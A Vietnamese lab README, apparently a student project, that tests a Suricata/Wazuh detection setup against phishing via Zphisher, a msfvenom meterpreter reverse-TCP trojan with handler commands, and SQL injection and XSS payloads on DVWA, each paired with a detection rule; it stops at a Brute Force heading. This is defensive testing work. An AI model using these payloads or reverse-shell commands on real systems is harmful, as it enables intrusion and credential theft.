Dưới đây là 1 số kịch bản tấn công để kiểm tra hệ thống giám sát phát hiện xâm nhập có hoạt động hiệu quả  
Các rule được triển khai cho các kịch bản:  
![Rule set](Image/Ruleset.png)  
  
## Kịch bản 1: tấn công Phising
Mục tiêu:  
- Thu thập trái phép thông tin xác thực (username và password) của người dùng.
- Mô phỏng tấn công xã hội nhằm đánh giá khả năng nhận diện các mối đe dọa của người dùng nội bộ.
- Ghi nhận các hành vi đáng ngờ và cảnh báo khi có truy cập đến các miền/phương thức tunneling thường dùng trong phishing.
  
Dùng công cụ Zphiser để tấn công vào máy nạn nhân  
![](Image/KB1_1.png)  
  
Zphiser sẽ tạo trang web giả mạo để dụ nạn nhân điền thông tin quan trọng như username, password  
![](Image/KB1_2.png)  
  
Khi nạn nhân điền xong thông tin thì sẽ được gửi qua máy kẻ tấn công
![](Image/KB1_3.png)  
![](Image/KB1_4.png)  
  
Rule để cảnh báo:  
alert tls any any -> any any (msg:"[HUNTING] Phising detect"; tls_sni; content:"trycloudflare.com"; nocase; classtype:policy-violation; sid:4000002; rev:1;)  
  
Giải thích rule:  
- tls_sni: kiểm tra trường SNI (Server Name Indication) trong TLS handshake  
- content:"trycloudflare.com": phát hiện người dùng đang truy cập vào miền này (thường dùng để ẩn IP thật khi phishing)  
- nocase: không phân biệt chữ hoa/thường  
- classtype:policy-violation: vi phạm chính sách (truy cập tên miền bị cấm)
  
Phía suricata  
![](Image/KB1_5.png)  
  
Phía Wazuh  
![](Image/KB1_6.png)  
  
![](Image/KB1_7.png)  
  
## Kịch bản 2: tấn công truyền mã độc
Mục tiêu:
- Tấn công vào người dùng khi truy cập khởi  động  
- Tạo một ứng dụng uy tín đánh lừa người dùng tải về
  
Tạo payload trojan.exe để lừa người dùng tải xuống:  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.39 LPORT=4444 -f exe > trojan.exe  
msfconsole  
use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse_tcp  
set LHOST 192.168.119.39 ( máy tấn công )  
set LPORT 4444  
exploit  
  
![](Image/KB2_1.png)  
  
![](Image/KB2_2.png)  
  
Mở port 80
![](Image/KB2_3.png)  
  
Máy nạn nhân sẽ truy cập 192.168.119.2:4444/trojan.exe → tự động tải mã độc về 
![](Image/KB2_4.png)  
  
Rule cảnh báo:  
alert http any any -> any any (msg:"[Trojan EXE Download Detected - MZ Header]"; flow: to_client, established; file_data; content:"MZ"; depth:2; classtype:trojan-ac tivity; sid:1002005; rev:1;)  
  
Giải thích rule:  
- file_data: cho phép Suricata kiểm tra nội dung file trong HTTP response  
- content:"MZ": MZ là chữ ký đầu tiên của file .exe (Windows executable)  
- depth:2 : chỉ kiểm tra 2 byte đầu tiên của file  
- flow: to_client: dữ liệu từ server trả về client  
- classtype:trojan-activity: hoạt động phần mềm độc hại
  
Phía suricata  
![](Image/KB2_5.png)  
  
Phía Wazuh
![](Image/KB2_6.png)  
  
## Kịch bản 3: tấn công web
Mục tiêu:  
- Truy cập trái phép vào thông tin nội bộ  
- Thực hiện các hành vi khai thác lỗ hổng bảo mật ứng dụng web  
- Kiểm tra mức độ phòng thủ và phát hiện của hệ thống giám sát  
Môi trường kiểm thử: website DVWA  
  
### SQL injection
Dùng các payload sau để kiểm tra SQL injection:  
‘ OR 1=1#  

' union select table_name,null from information_schema.tables#  

Rule cảnh báo:  
alert http any any -> any any (msg:"[ALERT] SQL Injection Keywords Detected"; flow: to_server, established; content:"'"; http_uri; pcre:"/('|- - |#|%27|%23)\s*(or | and )?|union\s+select/i"; classtype:web-application-attack; sid:1000021; rev:3;)  
  
Giải thích rule:  
- flow: to_server, established: lưu lượng từ client đến server qua kết nối HTTP đã thiết lập  
- content:"'" + http_uri: kiểm tra có dấu ' trong URI  
- pcre:"/('|- - |#|%27|%23)\s*(or | and )?|union\s+select/i": Regex tìm các pattern SQL Injection như ' or 1=1, --, #, %27, union select  
- classtype:web-application-attack: tấn công ứng dụng web
  
Phía suricata  
  
Phía Wazuh  
  
### XSS (Reflected, Restored)
#### XSS Reflected
Payload XSS Reflected  
Chèn <svg onload=alert('BugBot19 was here')> vào ô What’s your name  

  
Rule cảnh báo:  
alert http any any -> any any (msg:"Reflected XSS attempt - <script>"; content:"<script>"; nocase; http_uri; sid: 1001001; rev:1;)  
alert http any any -> any any (msg:"Reflected XSS attempt - <img src=x onerror>"; content:"<img src=x onerror"; nocase; http_uri; sid:1001002; rev:1;) alert http any any -> any any (msg:"Reflected XSS attempt - alert("; content:"alert("; nocase; http_uri; sid:1001003; rev:1;)  

Giải thích rule:  
- http_uri: kiểm tra trên phần URI  
- content:"<script>", "<img src=x onerror", "alert(": các payload XSS phổ biến  
- nocase: không phân biệt hoa thường  
  
Phía suricata
Phía Wazuh  
#### XSS Restored
Payload XSS Restored  
Chèn <script>alert(document.domain)</script> vào ô Message  
  
Rule cảnh báo:  
alert http any any -> any any (msg:"Stored XSS Detected in HTTP response"; content:"<script>"; nocase; http_server_body; sid:1001004; rev:1;)  
alert http any any -> any any (msg:"Stored XSS Detected - <img src=x onerror>"; content:"<img src=x onerror"; nocase; http_server_body; sid: 1001005; rev:1;)  

Giải thích rule:  
- http_server_body: kiểm tra nội dung phần body trả về từ server
- content:"<script>", "<img src=x onerror": payload XSS điển hình

Phía suricata  
Phía Wazuh  
### Brute Force
